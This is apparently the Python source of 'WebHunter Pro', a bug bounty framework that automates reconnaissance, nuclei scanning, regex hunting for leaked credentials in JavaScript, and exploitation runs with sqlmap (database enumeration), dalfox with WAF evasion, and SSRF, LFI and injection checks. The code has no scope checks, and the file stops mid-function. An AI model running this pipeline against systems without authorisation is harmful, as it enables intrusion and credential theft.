#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║           WebHunter Pro v2.0 - Full Web Hacking Arsenal          ║
║               Bug Bounty Automation Framework                    ║
║                     Author: Rehan Muzafar                        ║
╚══════════════════════════════════════════════════════════════════╝
"""

import subprocess, sys, os, json, time, argparse, threading, re, shutil
import urllib.request, urllib.parse, urllib.error
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─── Colors ────────────────────────────────────────────────────────────────────
class C:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
    WHITE = '\033[97m'; BOLD = '\033[1m'; DIM = '\033[2m'; RESET = '\033[0m'
    ORANGE = '\033[38;5;208m'; PURPLE = '\033[38;5;141m'; PINK = '\033[38;5;205m'

# ─── Banner ────────────────────────────────────────────────────────────────────
def banner():
    print(f"""{C.RED}{C.BOLD}
 ██╗    ██╗███████╗██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
 ██║    ██║██╔════╝██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
 ██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
 ██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
 ╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{C.RESET}{C.ORANGE}                    ██████╗ ██████╗  ██████╗  {C.PINK}v2.0 Full Arsenal
{C.ORANGE}                    ██╔══██╗██╔══██╗██╔═══██╗
                    ██████╔╝██████╔╝██║   ██║
                    ██╔═══╝ ██╔══██╗██║   ██║
                    ██║     ██║  ██║╚██████╔╝
                    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ {C.RESET}
{C.DIM}  ┌──────────────────────────────────────────────────────────────────────┐
  │  Recon → Enum → Crawl → Fuzz → Scan → Exploit → Report             │
  │  SQLi · XSS · SSRF · LFI · SSTI · CMDi · CORS · XXE · IDOR · JWT  │
  └──────────────────────────────────────────────────────────────────────┘{C.RESET}
""")

# ─── Logger ────────────────────────────────────────────────────────────────────
class Logger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.lock = threading.Lock()

    def _write(self, msg):
        with self.lock:
            clean = re.sub(r'\033\[[0-9;]*m', '', msg)
            with open(self.log_file, 'a') as f:
                f.write(clean + '\n')

    def _ts(self): return datetime.now().strftime('%H:%M:%S')

    def info(self, msg):
        out = f"{C.DIM}[{self._ts()}]{C.RESET} {C.CYAN}[*]{C.RESET} {msg}"
        print(out); self._write(out)

    def success(self, msg):
        out = f"{C.DIM}[{self._ts()}]{C.RESET} {C.GREEN}[+]{C.RESET} {C.GREEN}{msg}{C.RESET}"
        print(out); self._write(out)

    def warn(self, msg):
        out = f"{C.DIM}[{self._ts()}]{C.RESET} {C.YELLOW}[!]{C.RESET} {C.YELLOW}{msg}{C.RESET}"
        print(out); self._write(out)

    def error(self, msg):
        out = f"{C.DIM}[{self._ts()}]{C.RESET} {C.RED}[-]{C.RESET} {C.RED}{msg}{C.RESET}"
        print(out); self._write(out)

    def phase(self, msg):
        bar = "═" * 65
        out = f"\n{C.PURPLE}{C.BOLD}╔{bar}╗\n║  {msg:<63}║\n╚{bar}╝{C.RESET}"
        print(out); self._write(out)

    def vuln(self, vtype, url, detail="", severity="high"):
        sev_color = {'critical': C.RED, 'high': C.ORANGE, 'medium': C.YELLOW, 'low': C.BLUE}.get(severity.lower(), C.ORANGE)
        out = f"{C.DIM}[{self._ts()}]{C.RESET} {C.RED}{C.BOLD}[VULN]{C.RESET} {sev_color}[{severity.upper()}]{C.RESET} {C.WHITE}{C.BOLD}{vtype}{C.RESET} → {C.CYAN}{url}{C.RESET}"
        if detail:
            out += f"\n       {C.DIM}↳ {detail}{C.RESET}"
        print(out); self._write(out)

# ─── Tool Registry ─────────────────────────────────────────────────────────────
class ToolChecker:
    REQUIRED = {
        'subfinder':   'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
        'httpx':       'go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest',
        'katana':      'go install github.com/projectdiscovery/katana/cmd/katana@latest',
        'nuclei':      'go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
        'sqlmap':      'pip install sqlmap  OR  sudo apt install sqlmap',
        'dalfox':      'go install github.com/hahwul/dalfox/v2@latest',
        'ffuf':        'go install github.com/ffufproject/ffuf/v2@latest',
        'waybackurls': 'go install github.com/tomnomnom/waybackurls@latest',
        'gau':         'go install github.com/lc/gau/v2/cmd/gau@latest',
    }
    OPTIONAL = {
        # Recon
        'amass':         'go install -v github.com/owasp-amass/amass/v4/...@master',
        'assetfinder':   'go install github.com/tomnomnom/assetfinder@latest',
        'dnsx':          'go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest',
        'hakrawler':     'go install github.com/hakluke/hakrawler@latest',
        'gospider':      'go install github.com/jaeles-project/gospider@latest',
        # Param Discovery
        'arjun':         'pip install arjun',
        'paramspider':   'pip install paramspider',
        # Exploitation
        'ssrfmap':       'git clone https://github.com/swisskyrepo/SSRFmap && pip install -r SSRFmap/requirements.txt',
        'commix':        'git clone https://github.com/commixproject/commix.git',
        'xsstrike':      'git clone https://github.com/s0md3v/XSStrike.git && pip install -r XSStrike/requirements.txt',
        'tplmap':        'git clone https://github.com/epinna/tplmap.git',
        'corsy':         'git clone https://github.com/s0md3v/Corsy.git && pip install -r Corsy/requirements.txt',
        'jwt_tool':      'git clone https://github.com/ticarpi/jwt_tool.git && pip install -r jwt_tool/requirements.txt',
        'secretfinder':  'git clone https://github.com/m4ll0k/SecretFinder.git && pip install -r SecretFinder/requirements.txt',
        'linkfinder':    'git clone https://github.com/GerbenJavado/LinkFinder.git && pip install -r LinkFinder/requirements.txt',
        'nikto':         'sudo apt install nikto',
        'wfuzz':         'pip install wfuzz',
        'feroxbuster':   'cargo install feroxbuster',
        'nmap':          'sudo apt install nmap',
        'whatweb':       'sudo apt install whatweb',
        'gobuster':      'go install github.com/OJ/gobuster/v3@latest',
        'wpscan':        'gem install wpscan',
    }

    @staticmethod
    def check_all(log):
        log.phase("PHASE 0: TOOL DEPENDENCY CHECK")
        missing_req = []
        found = []

        print(f"\n  {C.BOLD}{C.CYAN}[ REQUIRED TOOLS ]{C.RESET}")
        for tool, hint in ToolChecker.REQUIRED.items():
            if shutil.which(tool):
                log.success(f"Found: {C.BOLD}{tool}{C.RESET}")
                found.append(tool)
            else:
                log.warn(f"Missing: {C.BOLD}{tool}{C.RESET}  →  {C.DIM}{hint}{C.RESET}")
                missing_req.append(tool)

        print(f"\n  {C.BOLD}{C.CYAN}[ OPTIONAL TOOLS ]{C.RESET}")
        for tool in ToolChecker.OPTIONAL:
            if shutil.which(tool) or _find_python_tool(tool):
                log.success(f"Optional found: {C.BOLD}{tool}{C.RESET}")
                found.append(tool)
            else:
                log.info(f"Optional missing: {C.DIM}{tool}{C.RESET}")

        print()
        if missing_req:
            log.warn(f"{len(missing_req)} required tools missing — some phases will be skipped.")
        else:
            log.success("All required tools found! Full scan mode enabled.")

        return found, missing_req

def _find_python_tool(name):
    """Check if a python tool exists in common locations"""
    paths = [
        f'/usr/local/bin/{name}', f'/usr/bin/{name}',
        f'{Path.home()}/tools/{name}/{name}.py',
        f'{Path.home()}/{name}/{name}.py',
        f'./{name}/{name}.py'
    ]
    return any(os.path.exists(p) for p in paths)

def _get_tool_path(name):
    """Get the executable path for a tool"""
    if shutil.which(name):
        return name
    # Check python script locations
    locations = [
        f'{Path.home()}/tools/{name}/{name}.py',
        f'{Path.home()}/{name}/{name}.py',
        f'./{name}/{name}.py',
        f'/opt/{name}/{name}.py',
    ]
    for loc in locations:
        if os.path.exists(loc):
            return f'python3 {loc}'
    return None

# ─── Results Store ─────────────────────────────────────────────────────────────
class ScanResults:
    def __init__(self, domain):
        self.domain = domain
        self.subdomains = []
        self.alive_hosts = []
        self.crawled_urls = []
        self.endpoints = []
        self.js_files = []
        self.vulnerabilities = []
        self.nuclei_findings = []
        self.sqli_findings = []
        self.xss_findings = []
        self.ssrf_findings = []
        self.lfi_findings = []
        self.cmdi_findings = []
        self.ssti_findings = []
        self.cors_findings = []
        self.jwt_findings = []
        self.secrets_found = []
        self.open_redirect_findings = []
        self.start_time = datetime.now()

    def add_vuln(self, vuln_type, url, severity, detail="", tool="", evidence=""):
        entry = {
            'type': vuln_type, 'url': url, 'severity': severity,
            'detail': detail, 'tool': tool, 'evidence': evidence,
            'found_at': datetime.now().isoformat()
        }
        self.vulnerabilities.append(entry)
        return entry

    def summary(self):
        sev_count = {}
        for v in self.vulnerabilities:
            sev_count[v['severity']] = sev_count.get(v['severity'], 0) + 1
        return {
            'domain': self.domain,
            'scan_date': self.start_time.isoformat(),
            'duration': str(datetime.now() - self.start_time),
            'stats': {
                'subdomains': len(self.subdomains),
                'alive_hosts': len(self.alive_hosts),
                'crawled_urls': len(self.crawled_urls),
                'endpoints': len(self.endpoints),
                'js_files': len(self.js_files),
                'total_vulnerabilities': len(self.vulnerabilities),
                'by_severity': sev_count,
            },
            'vulnerabilities': self.vulnerabilities,
            'secrets': self.secrets_found,
        }

# ─── Command Runner ────────────────────────────────────────────────────────────
def run_cmd(cmd, log, timeout=300, capture=True, shell=True):
    log.info(f"CMD: {C.DIM}{cmd[:120]}{C.RESET}")
    try:
        result = subprocess.run(cmd, shell=shell, capture_output=capture,
                                text=True, timeout=timeout)
        return result.stdout.strip() if capture else (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        log.warn(f"Timeout: {cmd[:60]}...")
        return ""
    except Exception as e:
        log.error(f"Command failed: {e}")
        return ""

# ─── Phase 1: Subdomain Enumeration ───────────────────────────────────────────
class SubdomainEnumerator:
    def __init__(self, domain, output_dir, log, results, available):
        self.domain = domain
        self.output_dir = output_dir
        self.log = log
        self.results = results
        self.available = available

    def run(self):
        self.log.phase("PHASE 1: SUBDOMAIN ENUMERATION")
        all_subs = set()

        # subfinder
        if 'subfinder' in self.available:
            self.log.info("Running subfinder...")
            out = run_cmd(f"subfinder -d {self.domain} -silent -all", self.log, timeout=120)
            if out:
                subs = [s.strip() for s in out.splitlines() if s.strip()]
                all_subs.update(subs)
                self.log.success(f"subfinder → {len(subs)} subdomains")

        # amass (passive)
        if 'amass' in self.available:
            self.log.info("Running amass (passive)...")
            out = run_cmd(f"amass enum -passive -d {self.domain} -silent", self.log, timeout=180)
            if out:
                subs = [s.strip() for s in out.splitlines() if self.domain in s]
                all_subs.update(subs)
                self.log.success(f"amass → {len(subs)} subdomains")

        # assetfinder
        if 'assetfinder' in self.available:
            self.log.info("Running assetfinder...")
            out = run_cmd(f"assetfinder --subs-only {self.domain}", self.log, timeout=60)
            if out:
                subs = [s.strip() for s in out.splitlines() if self.domain in s]
                all_subs.update(subs)
                self.log.success(f"assetfinder → {len(subs)} subdomains")

        # crt.sh
        self.log.info("Querying crt.sh...")
        try:
            url = f"https://crt.sh/?q=%.{self.domain}&output=json"
            req = urllib.request.Request(url, headers={'User-Agent': 'WebHunterPro/2.0'})
            with urllib.request.urlopen(req, timeout=30) as resp:
                data = json.loads(resp.read())
                for entry in data:
                    for sub in entry.get('name_value', '').splitlines():
                        sub = sub.strip().lstrip('*.')
                        if self.domain in sub:
                            all_subs.add(sub)
                self.log.success(f"crt.sh → total {len(all_subs)} unique subdomains")
        except Exception as e:
            self.log.warn(f"crt.sh failed: {e}")

        # DNS brute with dnsx
        if 'dnsx' in self.available and all_subs:
            self.log.info("Resolving with dnsx...")
            subs_file = f"{self.output_dir}/subs_raw.txt"
            with open(subs_file, 'w') as f:
                f.write('\n'.join(all_subs))
            out = run_cmd(f"dnsx -l {subs_file} -silent -resp", self.log, timeout=120)
            if out:
                resolved = [l.split()[0] for l in out.splitlines() if l.strip()]
                all_subs = set(resolved)
                self.log.success(f"dnsx → {len(all_subs)} resolved subdomains")

        self.results.subdomains = list(all_subs)
        out_file = f"{self.output_dir}/subdomains.txt"
        with open(out_file, 'w') as f:
            f.write('\n'.join(sorted(all_subs)))

        self.log.success(f"Total subdomains: {C.BOLD}{len(all_subs)}{C.RESET} → {out_file}")
        return list(all_subs)

# ─── Phase 2: Alive Host Detection ────────────────────────────────────────────
class AliveChecker:
    def __init__(self, subdomains, output_dir, log, results, available):
        self.subdomains = subdomains
        self.output_dir = output_dir
        self.log = log
        self.results = results
        self.available = available

    def run(self):
        self.log.phase("PHASE 2: ALIVE HOST DETECTION")

        targets = self.subdomains or [self.results.domain if hasattr(self.results, 'domain') else '']
        if not targets:
            self.log.warn("No targets. Skipping.")
            return []

        subs_file = f"{self.output_dir}/subdomains.txt"
        out_file = f"{self.output_dir}/alive_hosts.txt"

        if 'httpx' not in self.available:
            return self._basic_check(targets)

        cmd = (f"httpx -l {subs_file} -silent -status-code -title "
               f"-tech-detect -follow-redirects -threads 50 "
               f"-web-server -content-type -o {out_file}")
        run_cmd(cmd, self.log, timeout=180)

        # WhatWeb fingerprinting (optional)
        if 'whatweb' in self.available:
            self.log.info("Running whatweb for tech detection...")
            run_cmd(f"whatweb -i {out_file} --log-json={self.output_dir}/whatweb.json -q",
                    self.log, timeout=120)

        alive = []
        if os.path.exists(out_file):
            with open(out_file) as f:
                lines = [l.strip() for l in f if l.strip()]
            alive = [l.split()[0] for l in lines]

            print(f"\n{C.CYAN}{'─'*75}{C.RESET}")
            print(f"  {'URL':<45} {'STATUS':<8} {'SERVER / TECH'}")
            print(f"{C.CYAN}{'─'*75}{C.RESET}")
            for line in lines[:25]:
                parts = line.split()
                url = parts[0] if parts else ''
                status = parts[1] if len(parts) > 1 else ''
                rest = ' '.join(parts[2:])[:30] if len(parts) > 2 else ''
                color = C.GREEN if '200' in status else C.YELLOW if status.startswith('3') else C.RED
                print(f"  {url:<45} {color}{status:<8}{C.RESET} {C.DIM}{rest}{C.RESET}")
            if len(lines) > 25:
                print(f"  {C.DIM}... and {len(lines)-25} more{C.RESET}")
            print(f"{C.CYAN}{'─'*75}{C.RESET}\n")

        self.results.alive_hosts = alive
        self.log.success(f"Alive hosts: {C.BOLD}{len(alive)}{C.RESET}")
        return alive

    def _basic_check(self, targets):
        alive = []
        for sub in targets[:50]:
            for scheme in ['https', 'http']:
                try:
                    url = f"{scheme}://{sub}"
                    urllib.request.urlopen(url, timeout=5)
                    alive.append(url)
                    self.log.success(f"Alive: {url}")
                    break
                except: pass
        self.results.alive_hosts = alive
        return alive

# ─── Phase 3: URL Crawling & Param Discovery ──────────────────────────────────
class URLCrawler:
    def __init__(self, alive_hosts, domain, output_dir, log, results, available):
        self.alive_hosts = alive_hosts
        self.domain = domain
        self.output_dir = output_dir
        self.log = log
        self.results = results
        self.available = available

    def run(self):
        self.log.phase("PHASE 3: CRAWLING, URL DISCOVERY & PARAM HUNTING")
        all_urls = set()

        # Write clean hosts
        clean_hosts = f"{self.output_dir}/clean_hosts.txt"
        with open(clean_hosts, 'w') as f:
            for h in (self.alive_hosts or [self.domain])[:30]:
                url = h.split()[0]
                if not url.startswith('http'):
                    url = f'https://{url}'
                f.write(url + '\n')

        # katana
        if 'katana' in self.available:
            self.log.info("Running katana (JS-aware spider)...")
            cmd = (f"katana -list {clean_hosts} -silent -depth 3 "
                   f"-js-crawl -automatic-form-fill "
                   f"-ef png,jpg,gif,css,woff,ttf,ico,svg "
                   f"-o {self.output_dir}/katana_urls.txt")
            run_cmd(cmd, self.log, timeout=200)
            if os.path.exists(f"{self.output_dir}/katana_urls.txt"):
                with open(f"{self.output_dir}/katana_urls.txt") as f:
                    urls = [l.strip() for l in f if l.strip()]
                all_urls.update(urls)
                self.log.success(f"katana → {len(urls)} URLs")

        # hakrawler
        if 'hakrawler' in self.available:
            self.log.info("Running hakrawler...")
            with open(clean_hosts) as f:
                hosts = f.read().strip().splitlines()
            for host in hosts[:10]:
                out = run_cmd(f"echo '{host}' | hakrawler -subs -u", self.log, timeout=60)
                if out:
                    urls = [u.strip() for u in out.splitlines() if u.strip() and self.domain in u]
                    all_urls.update(urls)
            self.log.success(f"hakrawler → added URLs, total: {len(all_urls)}")

        # gospider
        if 'gospider' in self.available:
            self.log.info("Running gospider...")
            cmd = (f"gospider -S {clean_hosts} -c 10 -d 3 --sitemap "
                   f"--other-source -q -o {self.output_dir}/gospider_out")
            run_cmd(cmd, self.log, timeout=120)
            gs_dir = f"{self.output_dir}/gospider_out"
            if os.path.exists(gs_dir):
                for fname in os.listdir(gs_dir):
                    with open(f"{gs_dir}/{fname}") as f:
                        for line in f:
                            match = re.search(r'https?://[^\s\]]+', line)
                            if match and self.domain in match.group():
                                all_urls.add(match.group().strip())
            self.log.success(f"gospider done, total: {len(all_urls)}")

        # waybackurls
        if 'waybackurls' in self.available:
            self.log.info("Fetching wayback URLs...")
            out = run_cmd(f"echo {self.domain} | waybackurls", self.log, timeout=60)
            if out:
                urls = [u.strip() for u in out.splitlines() if self.domain in u]
                all_urls.update(urls)
                self.log.success(f"waybackurls → {len(urls)} historical URLs")

        # gau
        if 'gau' in self.available:
            self.log.info("Running gau...")
            out = run_cmd(f"gau --subs {self.domain}", self.log, timeout=60)
            if out:
                urls = [u.strip() for u in out.splitlines() if self.domain in u]
                all_urls.update(urls)
                self.log.success(f"gau → {len(urls)} URLs")

        # Save all URLs
        self.results.crawled_urls = list(all_urls)
        with open(f"{self.output_dir}/all_urls.txt", 'w') as f:
            f.write('\n'.join(sorted(all_urls)))

        # Extract JS files for secret scanning
        js_files = [u for u in all_urls if u.endswith('.js') or '.js?' in u]
        self.results.js_files = js_files
        with open(f"{self.output_dir}/js_files.txt", 'w') as f:
            f.write('\n'.join(js_files))
        self.log.success(f"JS files found: {C.BOLD}{len(js_files)}{C.RESET}")

        # Extract endpoints with params
        params_urls = [u for u in all_urls if '?' in u and '=' in u]
        self.results.endpoints = params_urls
        with open(f"{self.output_dir}/endpoints_with_params.txt", 'w') as f:
            f.write('\n'.join(params_urls))

        # Paramspider
        if _find_python_tool('paramspider') or 'paramspider' in self.available:
            self.log.info("Running paramspider for param discovery...")
            tool = _get_tool_path('paramspider') or 'paramspider'
            out = run_cmd(f"{tool} -d {self.domain} -q 2>/dev/null", self.log, timeout=120)
            ps_file = f"results/{self.domain}.txt"
            if os.path.exists(ps_file):
                with open(ps_file) as f:
                    ps_urls = [l.strip() for l in f if l.strip()]
                params_urls = list(set(params_urls + ps_urls))
                self.results.endpoints = params_urls
                self.log.success(f"paramspider → {len(ps_urls)} additional param URLs")

        # Arjun - hidden param discovery
        if _find_python_tool('arjun') or 'arjun' in self.available:
            self.log.info("Running arjun (hidden param discovery) on top targets...")
            arjun_targets = (self.alive_hosts or [])[:5]
            for target in arjun_targets:
                url = target.split()[0]
                arjun_out = f"{self.output_dir}/arjun_{re.sub(r'[:/.]', '_', url)}.json"
                tool = _get_tool_path('arjun') or 'arjun'
                run_cmd(f"{tool} -u {url} -oJ {arjun_out} -q", self.log, timeout=60)

        # LinkFinder for JS secrets/endpoints
        if _find_python_tool('linkfinder') and js_files:
            self.log.info(f"Running LinkFinder on {min(len(js_files), 10)} JS files...")
            lf_tool = _get_tool_path('linkfinder')
            lf_out = f"{self.output_dir}/linkfinder_endpoints.txt"
            for js in js_files[:10]:
                out = run_cmd(f"{lf_tool} -i {js} -o cli 2>/dev/null", self.log, timeout=30)
                if out:
                    with open(lf_out, 'a') as f:
                        f.write(f"\n# {js}\n{out}\n")
            self.log.success(f"LinkFinder done → {lf_out}")

        self.log.success(f"Total URLs: {C.BOLD}{len(all_urls)}{C.RESET} | Endpoints: {C.BOLD}{len(params_urls)}{C.RESET}")
        return list(all_urls)

# ─── Phase 4: Nuclei Scanning ─────────────────────────────────────────────────
class NucleiScanner:
    def __init__(self, targets, output_dir, log, results, available):
        self.targets = targets
        self.output_dir = output_dir
        self.log = log
        self.results = results
        self.available = available

    def run(self):
        self.log.phase("PHASE 4: NUCLEI VULNERABILITY SCANNING")

        if 'nuclei' not in self.available:
            self.log.warn("nuclei not found. Skipping.")
            return []

        self.log.info("Updating nuclei templates...")
        run_cmd("nuclei -update-templates -silent", self.log, timeout=120)

        # Write targets
        targets_file = f"{self.output_dir}/nuclei_targets.txt"
        with open(targets_file, 'w') as f:
            for t in (self.targets or [])[:50]:
                url = t.split()[0]
                if not url.startswith('http'):
                    url = f'https://{url}'
                f.write(url + '\n')

        out_file = f"{self.output_dir}/nuclei_results.json"
        cmd = (f"nuclei -l {targets_file} "
               f"-severity critical,high,medium "
               f"-rate-limit 50 -bulk-size 25 -concurrency 10 "
               f"-json-export {out_file} -silent")

        self.log.info("Scanning with default nuclei templates (critical/high/medium)...")
        run_cmd(cmd, self.log, timeout=600, capture=False)

        # Also scan endpoints with params
        if self.results.endpoints:
            ep_file = f"{self.output_dir}/endpoints_with_params.txt"
            ep_out = f"{self.output_dir}/nuclei_endpoints.json"
            cmd2 = (f"nuclei -l {ep_file} "
                    f"-severity critical,high,medium "
                    f"-rate-limit 30 -bulk-size 10 -concurrency 5 "
                    f"-json-export {ep_out} -silent")
            self.log.info("Scanning endpoints with parameters...")
            run_cmd(cmd2, self.log, timeout=300, capture=False)

        # Parse results
        findings = []
        for result_file in [out_file, f"{self.output_dir}/nuclei_endpoints.json"]:
            if os.path.exists(result_file):
                with open(result_file) as f:
                    for line in f:
                        try:
                            finding = json.loads(line.strip())
                            findings.append(finding)
                            sev = finding.get('info', {}).get('severity', 'unknown')
                            name = finding.get('info', {}).get('name', 'Unknown')
                            matched = finding.get('matched-at', '')
                            self.log.vuln(name, matched, tool='nuclei', severity=sev)
                            self.results.add_vuln(name, matched, sev, tool='nuclei')
                        except: pass

        self.results.nuclei_findings = findings
        self.log.success(f"Nuclei scan complete → {C.RED}{C.BOLD}{len(findings)} findings{C.RESET}")
        return findings

# ─── Phase 5: Secret & JS Analysis ────────────────────────────────────────────
class SecretScanner:
    def __init__(self, results, output_dir, log, available):
        self.results = results
        self.output_dir = output_dir
        self.log = log
        self.available = available

    def run(self):
        self.log.phase("PHASE 5: SECRET & JS FILE ANALYSIS")

        # SecretFinder
        if _find_python_tool('secretfinder') and self.results.js_files:
            self.log.info(f"Running SecretFinder on {min(len(self.results.js_files), 15)} JS files...")
            sf_tool = _get_tool_path('secretfinder')
            sf_out = f"{self.output_dir}/secrets.txt"
            for js in self.results.js_files[:15]:
                out = run_cmd(f"{sf_tool} -i {js} -o cli 2>/dev/null", self.log, timeout=30)
                if out and any(k in out.lower() for k in ['api', 'key', 'secret', 'token', 'password', 'auth']):
                    self.log.vuln("Sensitive Data in JS", js, out[:100], severity="high")
                    self.results.secrets_found.append({'file': js, 'data': out[:200]})
                    self.results.add_vuln("Secret/API Key Exposure", js, "high",
                                         out[:100], tool="secretfinder")
                    with open(sf_out, 'a') as f:
                        f.write(f"\n# {js}\n{out}\n")
        else:
            # Fallback: custom regex-based JS secret scanner
            self._custom_secret_scan()

    def _custom_secret_scan(self):
        """Custom regex-based secret scanner"""
        patterns = {
            'AWS Access Key':     r'AKIA[0-9A-Z]{16}',
            'AWS Secret Key':     r'(?i)aws.{0,20}secret.{0,20}[\'"][0-9a-zA-Z/+]{40}[\'"]',
            'Google API Key':     r'AIza[0-9A-Za-z\-_]{35}',
            'GitHub Token':       r'ghp_[0-9a-zA-Z]{36}',
            'Slack Token':        r'xox[baprs]-[0-9a-zA-Z]{10,48}',
            'Private Key':        r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----',
            'JWT Token':          r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',
            'Generic API Key':    r'(?i)(api[_-]?key|apikey)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})',
            'Generic Password':   r'(?i)(password|passwd|pwd)["\s:=]+["\']([^"\']{8,})["\']',
            'Bearer Token':       r'(?i)bearer\s+[a-zA-Z0-9\-_\.]{20,}',
        }

        if not self.results.js_files:
            self.log.info("No JS files to scan for secrets.")
            return

        self.log.info(f"Custom secret scan on {len(self.results.js_files)} JS files...")
        secrets_out = f"{self.output_dir}/secrets_found.txt"
        found_count = 0

        for js_url in self.results.js_files[:20]:
            try:
                req = urllib.request.Request(js_url, headers={'User-Agent': 'Mozilla/5.0 (WebHunterPro)'})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    content = resp.read().decode('utf-8', errors='ignore')
                    for name, pattern in patterns.items():
                        matches = re.findall(pattern, content)
                        if matches:
                            self.log.vuln(f"Secret: {name}", js_url,
                                         f"Found {len(matches)} match(es)", severity="high")
                            self.results.add_vuln(f"Secret Exposure: {name}", js_url,
                                                  "high", str(matches[0])[:50], tool="custom")
                            self.results.secrets_found.append({'type': name, 'url': js_url, 'match': str(matches[0])[:50]})
                            with open(secrets_out, 'a') as f:
                                f.write(f"[{name}] {js_url}\n  Match: {matches[0]}\n\n")
                            found_count += 1
            except: pass

        if found_count:
            self.log.success(f"Secrets found: {C.RED}{C.BOLD}{found_count}{C.RESET}")
        else:
            self.log.info("No obvious secrets found in JS files.")

# ─── Phase 6: Full Arsenal Exploitation ───────────────────────────────────────
class FullArsenalExploiter:
    def __init__(self, results, output_dir, log, available, args):
        self.results = results
        self.output_dir = output_dir
        self.log = log
        self.available = available
        self.args = args
        self.vuln_types = [v['type'].lower() for v in results.vulnerabilities]

    def run(self):
        self.log.phase("PHASE 6: FULL ARSENAL EXPLOITATION")
        endpoints = self.results.endpoints

        if not endpoints and not self.results.nuclei_findings:
            self.log.warn("No endpoints or findings. Skipping exploitation.")
            return

        self.log.info(f"Analyzing {len(endpoints)} endpoints...")

        # Run all exploitation modules
        with ThreadPoolExecutor(max_workers=3) as pool:
            futures = [
                pool.submit(self._run_sqlmap,        self._get_candidates(['id','user','username','name','search','query','cat','category','type','sort','order','item','product','page','num','limit','offset','pid','uid'])[:5]),
                pool.submit(self._run_dalfox,        self._get_candidates(['q','query','search','s','keyword','term','name','title','comment','content','message','callback','jsonp','input','text','data'])[:10]),
                pool.submit(self._run_ssrf,          self._get_candidates(['url','uri','path','dest','redirect','src','source','load','file','image','img','document','proxy','host'])[:10]),
            ]
            for f in as_completed(futures):
                try: f.result()
                except Exception as e: self.log.error(f"Exploit thread error: {e}")

        # Sequential exploits
        self._run_lfi(self._get_candidates(['file','path','page','doc','dir','include','inc','require','read','load','template','lang','language'])[:5])
        self._run_cmdi(self._get_candidates(['cmd','exec','command','run','shell','ping','host','ip','addr','query','process'])[:5])
        self._run_ssti(self._get_candidates(['template','view','name','title','content','subject','body','render','page'])[:5])
        self._run_cors_check()
        self._run_xxe_check()
        self._run_idor_check()
        self._run_jwt_check()
        self._run_open_redirect(endpoints[:20])
        self._run_nikto()

    def _get_candidates(self, param_list):
        """Get endpoint candidates matching given parameter names"""
        candidates = []
        for url in self.results.endpoints:
            for param in param_list:
                if re.search(rf'[?&]{re.escape(param)}=', url, re.IGNORECASE):
                    candidates.append(url)
                    break
        return list(dict.fromkeys(candidates))  # deduplicate preserving order

    # ── SQLi ────────────────────────────────────────────────────────────────
    def _run_sqlmap(self, urls):
        if not urls: return
        if 'sqlmap' not in self.available:
            self.log.warn("sqlmap not found — skipping SQLi testing")
            return
        self.log.info(f"{C.RED}[SQLi]{C.RESET} sqlmap on {len(urls)} candidates...")

        for url in urls:
            out_dir = f"{self.output_dir}/sqlmap_{abs(hash(url)) % 99999}"
            cmd = (f"sqlmap -u \"{url}\" --batch --smart --level=2 --risk=2 "
                   f"--output-dir={out_dir} --random-agent --forms --dbs "
                   f"--timeout=15 --retries=1 -q")
            out = run_cmd(cmd, self.log, timeout=150)
            if out and any(k in out.lower() for k in ['injectable', 'sqlmap identified', 'parameter appears to be']):
                self.log.vuln("SQL Injection", url, "sqlmap confirmed", severity="critical")
                self.results.add_vuln("SQL Injection", url, "critical", "sqlmap confirmed", tool="sqlmap")
                self.results.sqli_findings.append({'url': url, 'output': out[:500]})
                with open(f"{self.output_dir}/sqli_confirmed.txt", 'a') as f:
                    f.write(f"[+] {url}\n{out[:300]}\n{'='*50}\n")

    # ── XSS ─────────────────────────────────────────────────────────────────
    def _run_dalfox(self, urls):
        if not urls: return
        if 'dalfox' not in self.available:
            # Try XSStrike
            if _find_python_tool('xsstrike'):
                self._run_xsstrike(urls[:5])
            else:
                self.log.warn("dalfox/XSStrike not found — skipping XSS testing")
            return

        self.log.info(f"{C.YELLOW}[XSS]{C.RESET} dalfox on {len(urls)} candidates...")
        xss_targets = f"{self.output_dir}/xss_targets.txt"
        xss_out = f"{self.output_dir}/xss_dalfox.txt"
        with open(xss_targets, 'w') as f:
            f.write('\n'.join(urls))

        cmd = (f"dalfox file {xss_targets} --no-color --output {xss_out} "
               f"--worker 10 --timeout 10 --waf-evasion")
        run_cmd(cmd, self.log, timeout=180)

        if os.path.exists(xss_out):
            with open(xss_out) as f:
                content = f.read()
            vulns = [l for l in content.splitlines() if '[V]' in l or 'VULN' in l.upper()]
            for v in vulns:
                self.log.vuln("Cross-Site Scripting (XSS)", v, "dalfox confirmed", severity="high")
                self.results.add_vuln("XSS", v, "high", "dalfox confirmed", tool="dalfox")
            self.results.xss_findings = vulns

        # Also try XSStrike if available
        if _find_python_tool('xsstrike'):
            self._run_xsstrike(urls[:5])

    def _run_xsstrike(self, urls):
        xstrike = _get_tool_path('xsstrike')
